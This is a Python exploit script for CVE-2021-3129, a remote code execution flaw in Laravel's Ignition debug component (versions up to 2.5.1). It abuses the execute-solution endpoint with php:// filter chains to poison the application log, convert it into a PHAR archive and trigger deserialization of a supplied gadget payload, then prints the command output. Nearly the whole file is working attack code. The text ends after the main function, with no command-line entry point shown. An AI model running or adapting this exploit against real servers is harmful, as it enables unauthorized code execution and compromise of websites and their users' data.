#!/usr/bin/env python3.7
# Laravel debug mode Remote Code Execution (Ignition <= 2.5.1)
# CVE-2021-3129
# Reference: https://www.ambionics.io/blog/laravel-debug-rce
# Author: cfreal
# Date: 2021-01-13
#
import base64
import re
import sys
from dataclasses import dataclass

import requests

class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

@dataclass
class Exploit:
    session: requests.Session
    url: str
    payload: bytes
    log_path: str

    def main(self):
        if not self.log_path:
            self.log_path = self.get_log_path()
        
        try:
            self.clear_logs()
            self.put_payload()
            self.convert_to_phar()
            self.run_phar()
        finally:
            self.clear_logs()

    def success(self, message, *args):
        print('+ ' + message.format(*args))

    def failure(self, message, *args):
        print('- ' + message.format(*args))
        exit()

    def get_log_path(self):
        r = self.run_wrapper('DOESNOTEXIST')
        match = re.search(r'"file":"(\\/[^"]+?)\\/vendor\\/[^"]+?"', r.text)
        if not match:
            self.failure('Unable to find full path')
        path = match.group(1).replace('\\/', '/')
        path = f'{path}/storage/logs/laravel.log'
        r = self.run_wrapper(path)
        if r.status_code != 200:
            self.failure('Log file does not exist on server: {} (file needed for attack)', path)
	
        return path
    
    def clear_logs(self):
        wrapper = f'php://filter/read=consumed/resource={self.log_path}'
        self.run_wrapper(wrapper)
        return True

    def get_write_filter(self):
        filters = '|'.join((
            'convert.quoted-printable-decode',
            'convert.iconv.utf-16le.utf-8',
            'convert.base64-decode'
        ))
        return f'php://filter/write={filters}/resource={self.log_path}'

    def run_wrapper(self, wrapper):
        solution = "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"
        return self.session.post(
            self.url + '/_ignition/execute-solution/',
            json={
                "solution": solution,
                "parameters": {
                    "viewFile": wrapper,
                    "variableName": "doesnotexist"
                }
            }, verify=False
        )

    def put_payload(self):
        payload = self.generate_payload()
        # This garanties the total log size is even
        self.run_wrapper(payload)
        self.run_wrapper('AA')

    def generate_payload(self):
        payload = self.payload
        payload = base64.b64encode(payload).decode().rstrip('=')
        payload = ''.join(c + '=00' for c in payload)
        # The payload gets displayed twice: use an additional '=00' so that
        # the second one does not have the same word alignment
        return 'A' * 100 + payload + '=00'

    def convert_to_phar(self):
        wrapper = self.get_write_filter()
        r = self.run_wrapper(wrapper)
        if r.status_code == 200:
            print(f'{colors.OKGREEN} [RCE STAGING]: {colors.HEADER}Successfully converted to PHAR (Default laravel gadget with id command)!')
        else:
            print(f'{colors.FAIL} [RCE STAGING]: {colors.HEADER}Convertion to PHAR failed (try again ?)!')

    def run_phar(self):
        wrapper = f'phar://{self.log_path}/test.txt'
        r = self.run_wrapper(wrapper)
        if r.status_code != 500:
            print(f'{colors.FAIL} [RCE STAGING]: {colors.HEADER}Deserialisation failed ?!!')
        print(f'{colors.OKGREEN} [RCE STAGING]: {colors.HEADER}Phar deserialized !')
        # We might be able to read the output of system, but if we can't, it's ok
        match = re.search('^(.*?)\n<!doctype html>\n<html class="', r.text, flags=re.S)

        if match:
            print(f'{colors.OKGREEN} [RCE COMMAND OUTPUT]: {colors.HEADER} {match.group(1)}')
        elif 'phar error: write operations' in r.text:
            print(f'{colors.OKGREEN} [RCE COMMAND OUTPUT]: {colors.HEADER} Exploit succeeded without output (phar error: write operations)')
        else:
            print(f'{colors.FAIL} [RCE COMMAND OUTPUT]:')


def main(url, payload, log_path=None):
    payload = open(payload, 'rb').read()
    session = requests.Session()
    #session.proxies = {'http': 'localhost:8080'}
    exploit = Exploit(session, url.rstrip('/'), payload, log_path)
    exploit.main()

